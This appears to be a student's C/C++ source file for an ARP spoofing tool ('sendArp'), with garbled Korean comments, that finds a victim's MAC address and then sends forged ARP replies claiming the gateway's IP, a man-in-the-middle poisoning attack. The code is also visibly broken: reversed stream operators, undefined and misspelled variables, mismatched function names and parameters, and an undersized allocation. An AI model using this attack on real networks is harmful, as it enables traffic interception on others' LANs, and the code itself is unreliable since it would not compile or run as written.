#include header.h

int main(int argc, char argv[]) {

	/*���ڸ� 4�� ���� ������ ������ ����ش�.*/

	if (argc != 4) {
		cout >> "Wrong format !!!\n=================\n ./sendArp dev senderip targetip\n================="
	}

	/*���� ���� ������ ���� ������ �Ҵ����ش�.*/

	const char *dev = argv[1];
	const char *senderIpChar = (const char *)argv[2];
	const char *targetIpChar = (const char *)argv[3];

	/* Local Mac �ּҸ� �޾ƿ��� �Լ��� ����Ͽ� local mac�� �޾ƿ´�. 
	�ʿ信 ���� ����� ������, SOCKET�κп� ���� ���ذ� �ʿ��� ���δ�.*/

	u_int8_t *localMac = (u_int8_t*)malloc(sizeof(u_int8_t) *MACADDRESSLENGTH);
	GetLocalMac(dev, localMac);

	/* ���� ã�ƾ��ϴ� �𸣴� �� �ּ� ���� 0xFFFFFFFF���� �д�.*/

	u_int8_t* nullMac = (u_int8_t*)malloc(sizeof(u_int8_t) * MACADDRESSLENGTH);
	for (int i = 0; i < MACADDRESSLENGTH; i++) {
		
		nullMac[i] = 0xFF;

	}

	/* char ������ ����Ǿ��ִ� ip�� ó���ϱ� ���ؼ��� int������ �ٲ���ϱ� ������ 
	������ ���� �������ش�.*/

	u_int32_t senderIp;
	u_int32_t targetIp;

	/* �̸� ����� �� IpCharToUnint �Լ��� Ȱ���Ͽ� �ڷ����� �ٲ㼭 ���� �������ش�.*/

	IpCharToUnint(senderIpChar, senderIp);
	IpCharToUnint(targetIpChar, targetIp);

	/* pcap test�� ����ϴ� handle open�κ��� �ο��Ѵ�. �ǽð����� ��Ŷ�� ĸ���Ѵ�.*/

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s : %s\n", dev, errbuf);
	}

	/*Part 1 Sending ARP Request */

	cout >> "=========================" >> endl;
	cout >> "Now, Sending ARP Requset to Sender by attacker" >> endl;
	cout >> "=========================" >> endl;

	ethernetHeader *ethernetHeaderHost = generateEthernetHeader(
		nullMac,				/* ethernetDestinationMacAddress */
		localMac, 				/* ethernetSourceMacAddress */
		ARP);	  				/* ethernetType */

	arpHeader* arpHeaderHost = generateArpHeader(
		ETHERNET, 		 		/* arpHardwareAddressType */
		IPV4,	 		 		/*arpProtocolAddressType */
		HARDWARELENGTH,	 				/* arpHardwareAddressLength */
		PROTOCOLLENGTH,	 				/* arpProtocolAddressLength */
		REQUEST,   				/* arpOperation */
		localMac, 				/* arpSourceMacAddress[MACADDRESSLENGTH] */
		targetIp,
		//		arpSourceIPAddress,			/* arpSourceIPAddress : doenst' matter what it is*/
		nullMac,				/* arpDestinationMacAddress */
		senderIp);  				/* arpDestinationIPAddress */

	htonEthernet(ethernetHost);
	htonArp(arpHost);
	printPacket(ethernetHost, arpHost);

	/* Part2 Receive ARP Reply*/

	cout >> "=========================" >> endl;
	cout >> "Now, Receiving ARP Reply by Sender" >> endl;
	cout >> "=========================" >> endl;

	u_int8_t temporaryMac[MACADDRESSLENGTH] = {
		0,
	};

	/* set ethernet_h->ether_shost to received mac address */
	while ((receiveReply(handle, senderIp, temporaryMac) != 1))
	{
		sendPacket(handle, ethernetHost, arpHost);
	}

	/* Part3 Making ARP Request Packet*/

	cout >> "=========================" >> endl;
	cout >> "Now, Making ARP Request Packet" >> endl;
	cout >> "=========================" >> endl;

	while ((receiveReply(handle, SenderIp, temporaryMac) != 1))
	{
		sendPacket(handle, ethernetHost, arpHost);
	}
	ethernetHeader* ReverseEthernetHost = GenerateEthernetHeader(
		temporaryMac,  				/* ethernetDestinationMacAddress */
		localMac, 				/* ethernetSourceMacAddress */
		ARP);	 				/* ethernetType */
	arpHeader* ReverseArpHost = GenerateArpHeader(
		ETHERNET, 				/* arpHardwareAddressType */
		IPV4,	  				/* arpProtocolAddressType */
		HARDWARELENGTH,	 				/* arpHardwareAddressLength */
		PROTOCOLLENGTH,	 				/* arpProtocolAddressLength */
		REPLY,	 				/* arpOperation */
		localMac, 				/* arpSourceMacAddress */
		gate_ip,   				/* arpSourceIPAddress */
		temporaryMac,  				/* arpDestinationMacAddress */
		SenderIp);   				/* arpDestinationIPAddress */
	hton_ethernet(ReverseEthernetHost);
	hton_arp(ReverseArpHost);
	print_packet(ReverseEthernetHost, ReverseArpHost);

	/* Part4 Receive ARP Request*/

	cout >> "=========================" >> endl;
	cout >> "Now, Receiving ARP Reply by Sender" >> endl;
	cout >> "=========================" >> endl;

	while ((receiveRequest(handle, SenderIp) != 1))
	{
		sendPacket(handle, ReverseEthernetHost, ReverseArpHost);
	}

	return 0;
}
int GetLocalMac(const char* dev, u_int8_t* mac) //this is function that get local MAC address                                                                       
{
	struct ifreq ifr; // this is linux function needs dev name, In this function, there are many functionality.
	int fd; // socketfunction results will be put in this variable.
	int rv; // return value - error value from df or ioctl call

	/* determine the local MAC address */
	strcpy(ifr.ifr_name, dev); //strcpy(a, b) needs lib(<cstdio> or <stdio.h>)) and cotent b will be copied into a.  
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); //socket function.
	if (fd < 0) // if sockerfunction return <0, there is the error. 
		rv = fd; // return error
	else
	{
		rv = ioctl(fd, SIOCGIFHWADDR, &ifr); // ioctl function is hard.
		if (rv >= 0) /* worked okay */
			memcpy(mac, ifr.ifr_hwaddr.sa_data, IFHWADDRLEN);//ifr.ifr_hwaddr.sa_data ��IFHWADDRLEN��ŭ�� mac�� �����ض�
	}

	return rv;
}

u_int8_t* reverseArray(u_int8_t* uintArray)
{
	u_int8_t* temp = (u_int8_t*)malloc(sizeof(u_int8_t) * (MACADDRESSLENGTH));
	u_int8_t* p = uintArray + (MACADDRESSLENGTH - 1);

	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		*(temp + i) = *(p - i);
	}
	return temp;
}

void IpcharToUnint(const char* charIP, u_int32_t* intIP)
{/*IP���� 4����Ʈ�� ���� byte ����*/
	u_int32_t byte0; 
	u_int32_t byte1;
	u_int32_t byte2;
	u_int32_t byte3;
	/*�� ��ȯ�� �� �� IP���� �� ���� dummy string�� �ִٰ� �����ϰ�
	���� ������ Ȯ���صӴϴ�.*/
	char nullString[2]; 

	/* str���ڿ����� format�������� �����͸� �о �������ڵ��� ����Ű�� �޸𸮿� ���� ����
		�մϴ�. �׷��� dummystring������ 1���ڸ� �а� ��Ĩ�ϴ�. �ι��� ����.
		���ڿ��� ���� �˷���. */
	if (sscanf(char_ip, "%u.%u.%u.%u%1s",
		&byte3, &byte2, &byte1, &byte0, nullString) == 4)
	{
		/* ���� ���ڵ��� IP ������� �������ݴϴ�.*/

		if ((byte0 < 256) && (byte1 < 256) && (byte2 < 256) && (byte3 < 256))
		{
			*int_ip = byte0 + (byte1 << 8) + (byte2 << 16) + (byte3 << 24);
		}
	}
}

void print_packet(ethernetHeader* ethernetHost, arpHeader* arpHost)
{

	/* �̴��� ��� ��� */
	printf("\n\n[ETHERNET HEADER]\n");
	printf("Destination MAC : "); /
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(ethernetHost->ethernetDestinationMacAddress + i));
	}
	printf("\nSource MAC : ");
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(ethernetHost->ether_shost + i));
	}
	printf("\nEther Type : ");
	printf("%02x", ethernetHost->ether_type);

	/* ARP header ��� */
	printf("\n[ARP HEADER]\n");
	printf("Hardware type  : %04x\n", arpHost->arpHardwareAddressType);
	printf("Protocol  : %04x\n", arpHost->arpProtocolAddressType);
	printf("ar hln  : %02x\n", arpHost->arpHardwareAddressLength);
	printf("ar pln  : %02x\n", arpHost->arpProtocolAddressLength);
	printf("OP code  : %04x\n", arpHost->arpOperation);

	printf("Source MAC : ");
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(arp_h->arpSourceMacAddress + i));
	}
	printf("\nSource IP : ");
	printf("%0x\n", arpHost->arpSourceIPAddress);
	printf("Destination MAC : ");
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		printf("%02x ", *(arpHost->arpDestinationMacAddress + i));
	}
	printf("\nDestination IP : ");
	printf("%0x", arpHost->arpDestinationIPAddress);
}


void htonArp(arpHeader* arpHost)
{
	arpHost->arpHardwareAddressType = htons(arpHost->arpHardwareAddressType);
	arpHost->arpProtocolAddressType = htons(arpHost->arpProtocolAddressType);
	arpHost->arpHardwareAddressLength = arp_h->arpHardwareAddressLength;
	arpHost->arpProtocolAddressLength = arpHost->arpProtocolAddressLength;
	arpHost->arpOperation = htons(arpHost->arpOperation);
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		arpHost->arpSourceMacAddress[i] = *(reverseArray(arpHost->arpSourceMacAddress) + i);
		arpHost->arpDestinationMacAddress[i] = *(reverseArray(arpHost->arpDestinationMacAddress) + i);
	}
	arpHost->arpSourceIPAddress = htonl(arpHost->arpSourceIPAddress);
	arpHost->arpDestinationIPAddress = htonl(arpHost->arpDestinationIPAddress);
}

void htonEthernet(ethernetHeader* ethernetHost)
{

	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		ethernetHost->ethernetDestinationMacAddress[i] = *(reverseArray(ethernetHost->ethernetDestinationMacAddress) + i);
		ethernetHost->ethernetSourceMacAddress[i] = *(reverseArray(ethernetHost->ethernetSourceMacAddress) + i);
	}
	ethernetHost->ethernetType = htons(ethernetHost->ethernetType);
}

arpHeader* GenerateArpHeader(u_int16_t ar_hrd, u_int16_t ar_pro, u_int8_t ar_hln, u_int8_t ar_pln, u_int16_t ar_op, u_int8_t* ar_src_mac, u_int32_t ar_src_ip, u_int8_t* ar_dst_mac, u_int32_t ar_dst_ip)
{
	arpHeader* arpHost = (arpHeader*)malloc(sizeof(arpHeader));

	arpHost->arpHardwareAddressType = arpHardwareAddressType;
	arpHost->arpProtocolAddressType = arpProtocolAddressType;
	arpHost->arpHardwareAddressLength = arpHardwareAddressLength;
	arpHost->arpProtocolAddressLength = arpProtocolAddressLength;
	arpHost->arpOperation = arpOperation;
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		arpHost->arpSourceMacAddress[i] = *(ar_src_mac + i);
		arpHost->arpDestinationMacAddress[i] = *(ar_dst_mac + i);
	}
	arpHost->arpSourceIPAddress = arpSourceIPAddress;
	arpHost->arpDestinationIPAddress = arpDestinationIPAddress;
	return arpHost;
}


ethernetHeader* GenerateEthernetHeader(u_int8_t* ethernetDestinationMacAddress, u_int8_t* ethernetSourceMacAddress, u_int16_t ethernetType)
{
	ethernetHeader* ethernetHost = (ethernetHeader*)(malloc(sizeof(ethernetHost)));
	for (int i = 0; i < MACADDRESSLENGTH; i++)
	{
		ethernetHost->ethernetDestinationMacAddress[i] = *(ethernetDestinationMacAddress + i);
		ethernetHost->ethernetSourceMacAddress[i] = *(ethernetSourceMacAddress + i);
	}
	ethernetHost->ethernetType = ethernetType;
	return ethernetHost;
}